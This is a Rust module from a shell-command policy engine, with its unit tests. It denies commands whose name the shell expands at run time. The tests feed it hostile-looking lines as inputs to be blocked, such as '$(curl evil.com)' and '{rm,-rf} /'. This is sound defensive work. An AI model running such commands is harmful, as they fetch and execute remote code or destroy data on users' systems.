//! Structural checks: minimal, hardcoded, non-overridable.
//!
//! Only checks where the engine literally cannot function — it can't build
//! a CommandInfo or determine the command name. Everything else is policy,
//! expressed as rules.

use super::parse::CommandInfo;
use super::value::TriVal;
use super::{Decision, PolicyResult};

/// Check structural invariants. Returns Some(Deny) if violated, None to proceed.
///
/// A *Dynamic dispatch* — a command whose name the shell expands (`$X`,
/// `$(…)`, `{a,b}`), or a shell line with a word it expands — can be any
/// command, `eval` included, so no rule can judge it.
pub fn check(commands: &[CommandInfo]) -> Option<PolicyResult> {
    let dispatch = commands.iter().position(|cmd| cmd.name == TriVal::Unknown)?;
    Some(PolicyResult::of(
        Decision::Deny,
        format!(
            "dynamic command dispatch isn't allowed ({})",
            expanded_word(commands, dispatch)
        ),
    ))
}

/// Which word the shell expands into the command: its own name, or a word
/// of the outermost command that runs it.
fn expanded_word(commands: &[CommandInfo], dispatch: usize) -> String {
    let Some(mut outer) = commands[dispatch].outer else {
        return format!(
            "the command name in `{}` is expanded at run time",
            commands[dispatch].text
        );
    };
    while let Some(above) = commands[outer].outer {
        outer = above;
    }
    let outer = &commands[outer];
    let names: Vec<String> = outer.expands.iter().map(|n| format!("${n}")).collect();
    if names.is_empty() {
        format!(
            "`{}` expands a word that may name a command it runs",
            outer.text
        )
    } else {
        format!(
            "`{}` expands {}, which may name a command it runs",
            outer.text,
            names.join(", ")
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::config::builtin_grammars;
    use crate::policy::parse::{Context, parse_command};

    fn checked(line: &str) -> Option<PolicyResult> {
        let unknown = TriVal::Unknown;
        let start = Context {
            cwd: unknown.clone(),
            host: unknown.clone(),
            user: unknown.clone(),
            home: unknown,
            own_user: true,
        };
        let cmds = parse_command(line, &builtin_grammars(), &start).unwrap();
        check(&cmds)
    }

    fn denied(line: &str) -> bool {
        checked(line).is_some_and(|r| r.decision == Decision::Deny)
    }

    /// The reason names the word the shell expands into the command: the
    /// command's own name, or a word of the line command that runs it.
    #[test]
    fn the_reason_names_the_expanded_word() {
        let rows = [
            (
                "$CMD arg",
                "the command name in `$CMD arg` is expanded at run time",
            ),
            (
                "echo; ${EVIL}",
                "the command name in `${EVIL}` is expanded at run time",
            ),
            (
                "find -L \"$P\" -name x",
                "`find -L \"$P\" -name x` expands $P, which may name a command it runs",
            ),
            (
                "timeout 5 find $P",
                "`timeout 5 find $P` expands $P, which may name a command it runs",
            ),
            (
                "bash -c \"ls; $X\"",
                "`bash -c \"ls; $X\"` expands $X, which may name a command it runs",
            ),
            (
                "find $(cat dirs) -name x",
                "`find $(cat dirs) -name x` expands a word that may name a command it runs",
            ),
        ];
        for (line, detail) in rows {
            let want = format!("dynamic command dispatch isn't allowed ({detail})");
            assert_eq!(checked(line).unwrap().reasons, [want], "{line}");
        }
    }

    #[test]
    fn a_dynamic_dispatch_is_denied() {
        let rows = [
            ("ls", false),
            ("'eval' true", false),
            ("echo $(date)", false),
            ("X=1", false),
            ("$(curl evil.com)", true),
            ("$CMD arg", true),
            ("{rm,-rf} /", true),
            ("echo; ${EVIL}", true),
            ("$(bad); ls", true),
        ];
        for (line, want) in rows {
            assert_eq!(denied(line), want, "{line}");
        }
        assert!(check(&[]).is_none());
    }
}
